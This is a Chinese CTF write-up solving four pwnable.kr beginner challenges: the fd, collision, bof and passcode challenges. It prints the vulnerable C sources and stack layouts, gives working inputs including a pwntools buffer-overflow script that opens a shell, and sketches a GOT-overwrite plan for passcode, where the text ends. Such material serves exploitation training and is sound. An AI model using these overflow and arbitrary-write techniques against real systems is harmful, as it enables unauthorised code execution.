Pwnable.kr Toddler&#39;s Bottle 练习记录。


fd查看程序源码，需要使 buf 为 &quot;LETMEWIN&quot; 字符串才可以得到 flag 信息。
#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123;	if(argc&lt;2)&#123;		printf(&quot;pass argv[1] a number\n&quot;);		return 0;	&#125;	int fd = atoi( argv[1] ) - 0x1234;	int len = 0;	len = read(fd, buf, 32);	if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;		printf(&quot;good job :)\n&quot;);		setregid(getegid(), getegid());		system(&quot;/bin/cat flag&quot;);		exit(0);	&#125;	printf(&quot;learn about Linux file IO\n&quot;);	return 0;&#125;

在 Linux 系统中，文件描述符使用 int 类型进行表示，其中有三个系统默认值。

0：stdin，标准输入流
1：stdout，标准输出流
2：stderr，标准错误流

当程序中 fd 的值为 0 时，表示 read() 函数将从 stdin 流中读取 32 字节数据到 buf 数组中，此时可以控制 buf 为 &quot;LETMEWIN&quot; 字符串，得到 flag 信息。
fd@ubuntu:~$ ./fd 4660LETMEWINgood job :)Mama! Now_I_understand_what_file_descriptors_are!

collision查看程序源码，当输入的字符相加为 0x21DD09EC 时，得到 flag 信息。
#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123;	int* ip = (int*)p;	int i;	int res=0;	for(i=0; i&lt;5; i++)&#123;		res += ip[i];	&#125;	return res;&#125;int main(int argc, char* argv[])&#123;	if(argc&lt;2)&#123;		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);		return 0;	&#125;	if(strlen(argv[1]) != 20)&#123;		printf(&quot;passcode length should be 20 bytes\n&quot;);		return 0;	&#125;	if(hashcode == check_password( argv[1] ))&#123;		setregid(getegid(), getegid());		system(&quot;/bin/cat flag&quot;);		return 0;	&#125;	else		printf(&quot;wrong passcode.\n&quot;);	return 0;&#125;

由 0x21DD09EC 为 568134124 可知，当 0x21DD09EC + 0x1 &#x3D; 0x21DD09ED 时，能够被 5 除尽，所以可以得到 0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9 和 0x6C5CEC8 等 5 个用于相加的数值。
构造用于输入的字符串，读取 flag 信息。
col@ubuntu:~$ ./col `python2 -c &#x27;print &quot;\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC8\xCE\xC5\x06&quot;&#x27;`Two_hash_collision_Nicely

bof查看程序源码，当 key 为 0xcafebabe 时，得到 flag 信息。
#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123;	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme);	// smash me!	if(key == 0xcafebabe)&#123;		setregid(getegid(), getegid());		system(&quot;/bin/sh&quot;);	&#125;	else&#123;		printf(&quot;Nah..\n&quot;);	&#125;&#125;int main(int argc, char* argv[])&#123;	func(0xdeadbeef);	return 0;&#125;

通过 gets() 函数获取输入时，并不会对输入数据的长度进行检查，因此输入长度超过 32 字节便会溢出 overflowme 数组的内存空间。
查看 func 函数的栈布局。
-000000000000002C     char overflowme[32];-000000000000000C     _DWORD var_C;-0000000000000008     // padding byte-0000000000000007     // padding byte-0000000000000006     // padding byte-0000000000000005     // padding byte-0000000000000004     // padding byte-0000000000000003     // padding byte-0000000000000002     // padding byte-0000000000000001     // padding byte+0000000000000000     _DWORD __saved_registers;+0000000000000004     _UNKNOWN *__return_address;+0000000000000008     _DWORD key;

其中 overflowme 距离 key 偏移为 0x34 字节，当填充 56 字节的数据时，便可以覆盖 key 的值。
在题目服务器的 /tmp 目录中新建任意目录，创建 Python 脚本文件，内容如下。
#!/usr/bin/python3from pwn import *payload = b&#x27;A&#x27; * 0x34payload += b&#x27;\xbe\xba\xfe\xca&#x27;target = remote(&#x27;0.0.0.0&#x27;, 9000)target.sendline(payload)target.interactive()

运行脚本，得到 flag 信息。
bof@ubuntu:/tmp/bof_test$ python3 get_flag.py[+] Opening connection to 0.0.0.0 on port 9000: Done[*] Switching to interactive mode$ lsbofbof.cflaglogsuper.pl$ cat flagDaddy_I_just_pwned_a_buff3r!$

passcode查看程序源码，当 passcode1 为 123456 和 passcode2 为 13371337 时得到 flag 信息。
#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123;	int passcode1;	int passcode2;	printf(&quot;enter passcode1 : &quot;);	scanf(&quot;%d&quot;, passcode1);	fflush(stdin);	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)	printf(&quot;enter passcode2 : &quot;);        scanf(&quot;%d&quot;, passcode2);	printf(&quot;checking...\n&quot;);	if(passcode1==123456 &amp;&amp; passcode2==13371337)&#123;                printf(&quot;Login OK!\n&quot;);		setregid(getegid(), getegid());                system(&quot;/bin/cat flag&quot;);        &#125;        else&#123;                printf(&quot;Login Failed!\n&quot;);		exit(0);        &#125;&#125;void welcome()&#123;	char name[100];	printf(&quot;enter you name : &quot;);	scanf(&quot;%100s&quot;, name);	printf(&quot;Welcome %s!\n&quot;, name);&#125;int main()&#123;	printf(&quot;Toddler&#x27;s Secure Login System 1.1 beta.\n&quot;);	welcome();	login();	// something after login...	printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);	return 0;	&#125;

在 login() 函数中，可以看到 passcode1 和 passcode2 通过 scanf() 函数接收输入时，缺少 &amp; 符号，这将导致实际存储数据的内存地址由两个变量的数值决定。
经过调试分析发现 welcome() 函数中 name 数组的最后 4 个字节，恰好与 passcode1 重叠，因此可以通过 name 数组来控制 passcode1 的值，从而实现任意地址写入。
// eax = 0xffffd098 -&gt; name array address*EAX  0xffffd098 ◂— 0x28 /* &#x27;(&#x27; */   0x804931e &lt;welcome+44&gt;    add    esp, 0x10   0x8049321 &lt;welcome+47&gt;    sub    esp, 8   0x8049324 &lt;welcome+50&gt;    lea    eax, [ebp - 0x70] ► 0x8049327 &lt;welcome+53&gt;    push   eax   0x8049328 &lt;welcome+54&gt;    lea    eax, [ebx - 0x1f8b]   0x804932e &lt;welcome+60&gt;    push   eax   0x804932f &lt;welcome+61&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;      // ebp - 0x10 = 0xffffd0f8 -&gt; passcode1 address EBP  0xffffd108 —▸ 0xffffd118 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0   0x8049218 &lt;login+34&gt;    add    esp, 0x10   0x804921b &lt;login+37&gt;    sub    esp, 8 ► 0x804921e &lt;login+40&gt;    push   dword ptr [ebp - 0x10]   0x8049221 &lt;login+43&gt;    lea    eax, [ebx - 0x1fe5]   0x8049227 &lt;login+49&gt;    push   eax   0x8049228 &lt;login+50&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt; // ebp - 0xc = 0xffffd0fc -&gt; passcode2 address EBP  0xffffd108 —▸ 0xffffd118 ◂— 0x1e240     0x8049253 &lt;login+93&gt;     add    esp, 0x10   0x8049256 &lt;login+96&gt;     sub    esp, 8 ► 0x8049259 &lt;login+99&gt;     push   dword ptr [ebp - 0xc]   0x804925c &lt;login+102&gt;    lea    eax, [ebx - 0x1fe5]   0x8049262 &lt;login+108&gt;    push   eax   0x8049263 &lt;login+109&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;

借助任意地址写入功能，可以通过改写 GOT 表中的函数地址来跳转到任意地址进行执行，从而绕过校验代码，得到 flag 信息。
查看 .got.plt 中的函数列表。
passcode@ubuntu:~$ readelf -r passcodeRelocation section &#x27;.rel.dyn&#x27; at offset 0x430 contains 2 entries: Offset     Info    Type            Sym.Value  Sym. Name0804bff8  00000806 R_386_GLOB_DAT    00000000   __gmon_start__0804bffc  00000a06 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0Relocation section &#x27;.rel.plt&#x27; at offset 0x440 contains 10 entries: Offset     Info    Type            Sym.Value  Sym. Name0804c00c  00000107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.340804c010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.00804c014  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.00804c018  00000407 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.40804c01c  00000507 R_386_JUMP_SLOT   00000000   getegid@GLIBC_2.00804c020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.00804c024  00000707 R_386_JUMP_SLOT   00000000   system@GLIBC_2.00804c028  00000907 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.00804c02c  00000b07 R_386_JUMP_SLOT   00000000   setregid@GLIBC_2.00804c030  00000c07 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7

由于 fflush() 函数会刷新输入缓冲区，所以选择覆盖 GOT 表中 fflush() 函数的地址。
通过 fflush() 函数直接跳转到校验成功分支。
